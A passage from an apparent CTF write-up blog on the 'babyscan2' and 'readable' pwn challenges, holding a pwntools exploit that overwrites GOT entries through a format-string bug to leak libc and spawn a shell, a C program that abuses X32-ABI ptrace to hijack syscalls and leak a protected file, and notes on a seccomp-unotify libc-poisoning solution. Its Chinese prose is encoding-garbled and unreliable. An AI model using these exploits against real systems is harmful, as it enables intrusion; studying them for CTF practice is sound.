class="hljs-string">&quot;%15s&quot;</span>, size);<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isdigit</span>(*size))<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[-] Invalid number&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br><br>  buf = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(atoi(size) + <span class="hljs-number">1</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: &quot;</span>);<br>  <span class="hljs-built_in">snprintf</span>(fmt, <span class="hljs-keyword">sizeof</span>(fmt), <span class="hljs-string">&quot;%%%ss&quot;</span>, size); <span class="hljs-comment">//vuln is here</span><br>  <span class="hljs-built_in">scanf</span>(fmt, buf);<br><br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>__attribute__((constructor))<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setup</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);<br>  alarm(<span class="hljs-number">180</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>exp: æ¥è‡ªr3kapig-Lotus</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r = process(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan2/bin/chall&#x27;</span>)<br><span class="hljs-comment">#r = remote(&#x27;65.21.255.31&#x27;,33710)</span><br>elf = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan2/bin/chall&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan2/lib/libc.so.6&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Lotus_write</span>(<span class="hljs-params">addr,content</span>):</span><br>    r.recvuntil(<span class="hljs-string">b&quot;size: &quot;</span>)<br>    r.send(<span class="hljs-string">b&#x27;9$\x00\x00\x00\x00\x00\x00&#x27;</span>+p64(addr)[:<span class="hljs-number">7</span>])<br>    r.recvuntil(<span class="hljs-string">&quot;data: &quot;</span>)<br>    r.sendline(content)<br><br><span class="hljs-comment"># gdb.attach(r,&#x27;b *0x40132b&#x27;)</span><br><span class="hljs-comment"># gdb.attach(r,&#x27;b *0x401286&#x27;)</span><br><span class="hljs-comment"># Lotus_write(elf.got[&quot;atoi&quot;],p64(elf.plt[&quot;printf&quot;])+p64(0x401140)+p64(0x401256)[:7])</span><br>Lotus_write(elf.got[<span class="hljs-string">&quot;exit&quot;</span>],p64(<span class="hljs-number">0x401256</span>)[:<span class="hljs-number">7</span>])<br><span class="hljs-comment"># gdb.attach(r,&#x27;b *0x40128B&#x27;)</span><br><span class="hljs-comment"># r.recvuntil(b&quot;size: &quot;)</span><br><span class="hljs-comment"># r.sendline(b&#x27;%p&#x27;)</span><br><br><span class="hljs-comment"># print(hex(elf.plt[&quot;atoi&quot;]))</span><br>Lotus_write(elf.got[<span class="hljs-string">&quot;atoi&quot;</span>],p64(elf.plt[<span class="hljs-string">&quot;printf&quot;</span>])[:<span class="hljs-number">7</span>])<br><span class="hljs-comment"># gdb.attach(r,&#x27;b *0x4012CD&#x27;)</span><br><br>r.recvuntil(<span class="hljs-string">b&quot;size: &quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;1-%9$p+&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">b&#x27;-&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">b&#x27;+&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">0x9A154</span><br>r.recvuntil(<span class="hljs-string">b&quot;data: &quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>ogg = libc_base+<span class="hljs-number">0xe3b01</span><br>Lotus_write(elf.got[<span class="hljs-string">&quot;printf&quot;</span>],p64(ogg)[:<span class="hljs-number">7</span>])<br><span class="hljs-comment"># gdb.attach(r)</span><br><span class="hljs-comment"># r.recvuntil(b&quot;size: &quot;)</span><br><span class="hljs-comment"># r.sendline(b&#x27;15&#x27;)</span><br><br>log.success(<span class="hljs-string">&quot;libc_base: &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="readable"><a href="#readable" class="headerlink" title="readable"></a>readable</h2><p>ç»ˆäºå‘ç°äº†è¿™é¢˜ç›®ç¯å¢ƒçš„ç”¨æ³•, å…ˆæ˜¯build.shç¼–è¯‘ä¸€ä¸‹ç„¶åå†docker build, ç„¶ådeploy.pyä¸­æœ‰ä¸€å¥socatå‘½ä»¤æ˜¯åœ¨æœ¬åœ°å¼€ä¸€ä¸ªç«¯å£æ¥æ”¶expæ–‡ä»¶, ä¿å­˜ä¸ºtempfile, ç„¶åæ˜ å°„åˆ°dockerä¸­çš„<code>/tmp/exploit</code>, ç»§ç»­å¯åŠ¨docker, å®Œæˆæƒé™è®¾ç½®ä¹‹åæ‰§è¡Œ/home/pwn/run. runè®¾ç½®äº†seccompä¹‹åexecveäº†exploit, ç„¶åå†æ€ä¹ˆæ‰§è¡Œreadmeå°±æ˜¯æˆ‘ä»¬çš„äº‹äº†. </p><h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution 1"></a>solution 1</h3><p>X32 ABIç›´æ¥ptraceæ‹¿mmapçš„pieåŸºå€åŠ«æŒwriteç›´æ¥leak, ç›´æ¥åˆ©ç”¨mmapç³»ç»Ÿè°ƒç”¨æ—¶çš„åœ°å€ä¿¡æ¯æ‰“å°å‡ºå‰0x2000çš„ä¸œè¥¿, è¿™æ ·ç›´æ¥å°±å¯ä»¥å‘ç°flag. </p><p>è¿™ä¸ªç¼–è¯‘èµ·æ¥ä¸å¾—ä½¿ç”¨32ä½? è¯•ä¸‹. è¿˜æ˜¯å¾—64ä½. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/personality.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> base = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> *<span class="hljs-title">regs</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-comment">// X32 ABI å¯¹æŒ‡é’ˆè¦æ±‚ 32 ä½</span><br>    regs = mmap((<span class="hljs-keyword">void</span> *)<span class="hljs-number">0x233000</span>,<span class="hljs-number">0x1000</span>,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">pid_t</span> traced_process;<br>    <span class="hljs-keyword">long</span> ins;<br>    <span class="hljs-keyword">char</span> *argvs[] = &#123;<span class="hljs-string">&quot;/home/pipe/readme&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// ptrace(PTRACE_TRACEME, 0, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        execve(<span class="hljs-string">&quot;/home/pipe/readme&quot;</span>, argvs, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;exec failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    wait(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">int</span> blocked = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// Wait until the child makes a syscall</span><br>        <span class="hljs-comment">// ptrace(PTRACE_SYSCALL, pid, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SYSCALL, pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <br>        waitpid(pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <br>        <span class="hljs-comment">// ptrace(PTRACE_GETREGS, pid, 0, &amp;regs);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_GETREGS, pid, <span class="hljs-number">0</span>, regs);<br>        <span class="hljs-comment">// è·å–ç¨‹åºåŸºå€ï¼Œç”¨ strace åœ¨æœ¬åœ°è§‚å¯Ÿå¾—åˆ°ç‰¹å¾</span><br>        <span class="hljs-keyword">if</span>(regs-&gt;orig_rax == <span class="hljs-number">10</span> &amp;&amp; regs-&gt;rsi==<span class="hljs-number">0x1000</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Mmap Rdi:%08llx\nMmap Rsi:%08llx\nMmap Rdx:%08llx\n&quot;</span>,regs-&gt;rdi,regs-&gt;rsi,regs-&gt;rdx);<br>            base = regs-&gt;rdi;<br>        &#125;<br>        <span class="hljs-comment">// éšä¾¿åŠ«æŒä¸€ä¸ª Write çš„ç³»ç»Ÿè°ƒç”¨ï¼Œrsi åŠ«æŒåˆ°åŸºå€ï¼Œrdx å¤§å°å¤§ä¸€ç‚¹</span><br>        <span class="hljs-keyword">if</span> (regs-&gt;orig_rax == <span class="hljs-number">1</span> &amp;&amp; regs-&gt;rdx == <span class="hljs-number">0x10</span>) &#123;<br>            blocked = <span class="hljs-number">1</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Rsi before:%08llx\n&quot;</span>,regs-&gt;rsi);<br>            regs-&gt;rdx = <span class="hljs-number">0x2000</span>;<br>            regs-&gt;rsi = base;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Rsi after:%08llx\n&quot;</span>,regs-&gt;rsi);<br>            <span class="hljs-comment">// ptrace(PTRACE_SETREGS, pid, 0, regs);</span><br>            syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SETREGS, pid, <span class="hljs-number">0</span>, regs);<br>        &#125;<br>        <span class="hljs-comment">// Continue on with the now blocked syscall</span><br>        <span class="hljs-comment">// ptrace(PTRACE_SYSCALL, pid, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SYSCALL, pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>        waitpid(pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// If the program checks return value of the write, we need to make sure that the return value isn&#x27;t `-ENOSYS`</span><br>        <span class="hljs-comment">// if (blocked) &#123;regs-&gt;rax = 1; ptrace(PTRACE_SETREGS, pid, 0, regs); &#125;</span><br>        <span class="hljs-keyword">if</span> (blocked) &#123;regs-&gt;rax = <span class="hljs-number">1</span>; syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SETREGS, pid, <span class="hljs-number">0</span>, regs); <span class="hljs-keyword">break</span>;&#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>çœŸæ­£çš„ç³»ç»Ÿè°ƒç”¨å·ä¿å­˜åœ¨ /usr/include/x86_64-linux-gnu/asm/unistd_x32.hï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> _ASM_X86_UNISTD_X32_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _ASM_X86_UNISTD_X32_H 1</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_read (__X32_SYSCALL_BIT + 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_write (__X32_SYSCALL_BIT + 1)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_open (__X32_SYSCALL_BIT + 2)</span><br>...<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_ioctl (__X32_SYSCALL_BIT + 514)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_readv (__X32_SYSCALL_BIT + 515)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_writev (__X32_SYSCALL_BIT + 516)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_recvfrom (__X32_SYSCALL_BIT + 517)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_sendmsg (__X32_SYSCALL_BIT + 518)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_recvmsg (__X32_SYSCALL_BIT + 519)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_execve (__X32_SYSCALL_BIT + 520)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_ptrace (__X32_SYSCALL_BIT + 521)</span><br>...<br></code></pre></div></td></tr></table></figure><ul><li><p>è€Œ<code>__X32_SYSCALL_BIT</code>çš„å€¼ä¸º<code>0x40000000</code>, æ‰€ä»¥ä¸Šé¢çš„æ•°å€¼ä¸Šå°±å¯ä»¥è§£é‡Šäº†. </p></li><li><p>int 0x80 å’Œ syscall çš„<a href="https://stackoverflow.com/questions/46087730#answer-46087731">åŒºåˆ«</a> (å¥½å§è·Ÿè¿™ä¸ªæ²¡å•¥å…³ç³». </p></li><li><p>ä¸»è¦åˆ©ç”¨ç‚¹åœ¨äºx64ä¸‹æœ‰ä¸€ç§x32 ABIæ¨¡å¼, èƒ½å¤Ÿåœ¨å‡å°æŒ‡é’ˆå’Œåœ°å€ç©ºé—´å¼€é”€çš„åŒæ—¶åˆ©ç”¨èµ·64ä½cpuä¸Šå¤šçš„å¯„å­˜å™¨å’Œè¿ç®—éƒ¨ä»¶, æé«˜ç¨‹åºè¿è¡Œé€Ÿåº¦. ä»–çš„ç³»ç»Ÿè°ƒç”¨å°±å¦‚ä¸Šé¢æ‰€ç¤º, åªè¦åŠ ä¸Šä¸€ä¸ªæ•°å€¼å³å¯, æˆ–è€…è¯´æ˜¯æŒ‰ä½æˆ–(|). è€Œå¯„å­˜å™¨é«˜32ä½çš„éƒ¨åˆ†éƒ½è¢«æ¸…ç©º, ä»¥æ­¤æ¨¡æ‹Ÿ32ä½è¿è¡ŒçŠ¶æ€. </p></li></ul><p>è¿˜æ²¡æœ‰runè¿‡, ç¬¬äºŒå¤©ç¯å¢ƒå¼„ä¸€ä¸ªå°æ—¶æ²¡æ•´å¥½, çœ‹æ¥è¿˜æ˜¯å¾—é docker. ç»ˆäºçŸ¥é“äº†è¿™ä¸€å †ä¸œè¥¿æ€ä¹ˆç”¨äº†. </p><p>ä¸è¿‡ä¸ºä»€ä¹ˆæ²¡æ³•ç›´æ¥è·‘é€š? çœ‹ç€æŒºå¥½çš„å‘€, ä½†æ˜¯çœ‹èµ·æ¥ptraceå…¨éƒ½å¤±è´¥äº†, regsé‡Œé¢æ²¡æœ‰ä¸€ç‚¹ä¿¡æ¯. </p><p>æˆ‘è¿˜ä¸çŸ¥é“åœ¨dockeré‡Œé¢è¿è¡Œçš„ç¨‹åºå¦‚ä½•è°ƒè¯•. </p><p>ptraceçœŸçš„failäº†, è¿”å›äº†ä¸€ä¸ª-1. ç»§ç»­æŸ¥æŸ¥errnoçœ‹æ˜¯ä»€ä¹ˆ. æ˜¯not implement. ä¸çŸ¥é“äº†. åªèƒ½ä¸€é—®é˜Ÿå‹. </p><p>crazymanè¯´ubuntu18èƒ½è¡Œ, ä½†æ˜¯dockeré‡Œé¢æ”¹æˆ18.04å¹¶ä¸å¯è¡Œ. emmmmm?éš¾é“ä¸æ˜¯è¿™æ ·ä¹ˆ?</p><p>22/11/14<strong>åœ¨ç¼–è¯‘linuxæ—¶å‘ç°æœ‰ä¸€ä¸ªé€‰é¡¹æ˜¯x32 ABI for 64 bit mode</strong>, å‹¾ä¸Šäº†é‡æ–°ç¼–è¯‘, å°è¯•äº†ä¸‹èƒ½ä¸èƒ½è¿è¡Œ. </p><p>ä¿®æ”¹HOMEè·¯å¾„, å†æŠŠreadmeé‡æ–°ç¼–è¯‘æˆé™æ€æ–‡ä»¶, æ”¾åˆ°HOMEä¸­è®¾ç½®æˆå…¶ä»–ç”¨æˆ·åªè¯», å¿½ç•¥run.c(å› ä¸ºä»–åªæ˜¯é™åˆ¶äº†ä¸€ä¸‹å¯ç”¨çš„ç³»ç»Ÿè°ƒç”¨)</p><p>è¿˜æ˜¯é‡åˆ°äº†å¾ˆå¤šé—®é¢˜. </p><ul><li>ä½¿ç”¨busyboxçš„linuxè¿˜æ˜¯æœ‰å¾ˆå¤šé™åˆ¶, æ¯ä¸ªæ–‡ä»¶éƒ½å¾—ç¼–è¯‘æˆé™æ€æ–‡ä»¶, ä½¿å¾—æœ¬æ¥æ˜¯PIEçš„readmeå˜æˆé™æ€é“¾æ¥æ–‡ä»¶, ç„¶åmmapè°ƒç”¨ä¼¼ä¹æ¶ˆå¤±äº†, ptraceæ ¹æœ¬æˆªå–ä¸åˆ°(???), ä¹Ÿæ²¡æœ‰straceçœ‹åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆ. </li><li>è€Œä¸”é™æ€é“¾æ¥ä¹Ÿä½¿å¾—æ–‡ä»¶å˜å¾—å¾ˆå¤§, ä»…è¾“å‡ºå‰é¢0x2000å­—èŠ‚è¿˜æ˜¯ä¸å¤Ÿ, è¿˜å¾—è°ƒæ•´. </li></ul><p>ä¸è¿‡å¥½åœ¨å‘ç°äº†è¿™ä¸ªæ–¹æ³•<strong>ç¡®å®å¯è¡Œ</strong>, ä¸è¿‡dockeré‡Œé¢çš„ç³»ç»Ÿä¼¼ä¹éƒ½æ²¡æœ‰åŠ ä¸Šè¿™ä¸€ä¸ªé€‰é¡¹, æƒ³æ¥å½“æ—¶æ¯”èµ›æ—¶çš„ç¯å¢ƒå¯ä»¥å§. ä¸è¿‡æ˜æ˜éƒ½æ˜¯åŒä¸€ä¸ªDockerfileæ€ä¹ˆè¿˜ä¸ä¸€æ ·å‘¢. </p><h3 id="solution-2-intended-one"><a href="#solution-2-intended-one" class="headerlink" title="solution 2 - intended one"></a>solution 2 - intended one</h3><blockquote><p>given by the author</p></blockquote><h4 id="ä½œè€…åŸè¯"><a href="#ä½œè€…åŸè¯" class="headerlink" title="ä½œè€…åŸè¯:"></a>ä½œè€…åŸè¯:</h4><ul><li>Intended way was using seccomp unotify to change libc binary</li><li>Linker loads libc, you set a hook for openat. And then use seccomp_setfd to send a poisoned libc</li></ul><p>seccomp unotify: user notify, å¯ä»¥åšåˆ°åœ¨syscallçš„æ—¶å€™æºå¸¦ä¿¡æ¯ç»™supervisor(å¤§å¤šéƒ½æ˜¯containeråº”ç”¨), è®©å®ƒæ¥å†³å®šæ˜¯ç»§ç»­æ‰§è¡Œsyscallè¿˜æ˜¯åœæ­¢æ‰§è¡Œå¹¶è¿”å›ç‰¹å®šæ•°å€¼. </p><h4 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹:"></a>æµç¨‹:</h4><ul><li>solve.pyä¸Šä¼ äº†exploit, ç„¶åexploitåœ¨dockeré‡Œæ¥å—payloadæ”¾åˆ°<code>/tmp/payload</code>. </li><li>expä½¿ç”¨UNIX domain socketå»ºç«‹ç¨‹åºé—´é€šä¿¡æ¸ é“. </li><li>è£…è½½sigchild signalçš„å¤„ç†å‡½æ•°, handlerç›´æ¥æ‰§è¡Œ<code>exit()</code>. </li><li>forkå‡ºå­è¿›ç¨‹, ä¸€é€šprctl+install seccomp unotifierä¹‹åé€šè¿‡socketå‘é€notifyfdåˆ°çˆ¶è¿›ç¨‹, å†æ‰§è¡Œ<code>/home/pwn/readme</code>.<br>å…¶ä¸­installçš„è§„åˆ™ä¸»è¦æ˜¯ä¸ºopenatè£…è½½unotify. </li><li>(ç„¶åéƒ½æ˜¯unotify supervisorçš„åŸºæœ¬æµç¨‹)</li><li>é€šè¿‡socketæ¥å—unotify fd. (è¿™ä¸ªæµç¨‹ä¹Ÿå¾ˆé•¿, ä½¿ç”¨äº†recvmsgç­‰ä¸€ç³»åˆ—å¥‡æ€ªå‡½æ•°, ä¸ç®¡äº†.)</li><li>é€šè¿‡ioctlæ¥è½®è¯¢fd, å½“readme openatçš„æ—¶å€™ä¼šè¢«æ‰“æ–­, æ­¤æ—¶ç”±çˆ¶è¿›ç¨‹æ‰“å¼€payloadæ–‡ä»¶, ç„¶åé€šè¿‡seccomp_notif_addfdæ¥å¤åˆ¶fdåˆ°å­è¿›ç¨‹çš„fdåˆ—è¡¨ä¹‹ä¸­, ç”±ioctlè¿”å›åœ¨å­è¿›ç¨‹ä¸­æœ€ç»ˆæ‰“å¼€çš„fd number, æœ€åresponse, è®¾ç½®openat syscallçš„è¿”å›å€¼ä¸ºè¯¥fd number. </li><li>ä¸Šé¢çš„æµç¨‹æ˜¯ä¸€ä¸ªæ­»å¾ªç¯, ç”±child exitåˆ°signal handlerç»ˆæ­¢æ‰€æœ‰è¿›ç¨‹.  </li></ul><h4 id="å…³é”®ç‚¹"><a href="#å…³é”®ç‚¹" class="headerlink" title="å…³é”®ç‚¹:"></a>å…³é”®ç‚¹:</h4><ul><li>UNIX domain socket or IPC socket</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br>sockfd = socket(<span class="hljs-keyword">int</span> socket_family, <span class="hljs-keyword">int</span> socket_type, <span class="hljs-keyword">int</span> protocol);<br></code></pre></div></td></tr></table></figure><p>å…¶ä¸­socket_family=AF_UNIX, socket_typeæœ‰ä¸‰ç§(TCP UDP SCTP?)</p><p>sendæ˜¯fdå’Œrecvfdå‡½æ•°éƒ½æ˜¯ä½¿ç”¨sendmsgæ¥â€¦..çœ‹ä¸æ‡‚, ä¸€å †å®å®šä¹‰, åæ­£çŸ¥é“ä»–èƒ½é€šè¿‡socket fdæ¥ä¼ é€’fdå°±è¡Œäº†. </p><ul><li>seccomp unotify:<code>seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, &amp;prog);</code> </li></ul><p>å› ä¸ºglibcæ²¡æœ‰å¯¹seccomp wrap, æ‰€ä»¥å®é™…ä¸Šæ˜¯:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">seccomp</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> operation, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">void</span> *args)</span></span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_seccomp, operation, flags, args); &#125;<br></code></pre></div></td></tr></table></figure><p>ç¬¬ä¸€ä¸ª<code>SECCOMP_SET_MODE_FILTER</code>å°±æ˜¯æŒ‡æŠŠargå½“æˆBPFæŒ‡é’ˆæ¥å®šä¹‰ä¸€ä¸ªfilter. è¿™ä¸ªfilteråœ¨fork clone execveçš„æ—¶å€™ä¿ç•™ä¸‹æ¥. <strong>å‰æ</strong>æ˜¯è°ƒç”¨çš„çº¿ç¨‹å¿…é¡»åœ¨å®ƒçš„namespaceé‡Œæœ‰CAP_SYS_ADMIN, æˆ–è€…å·²ç»è®¾ç½®äº†no_new_privsä½. </p><p>ä¸€èˆ¬éƒ½å…³æ³¨åè€…, ä¹Ÿå°±æ˜¯é€šè¿‡<code>prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)</code>è®¾ç½®. è¿™ä¸ªprocess controlå‡½æ•°é…ä¸Šè¿™äº›å‚æ•°èƒ½å¤Ÿé™åˆ¶execveæ‰§è¡Œsetuidçš„ç¨‹åº, 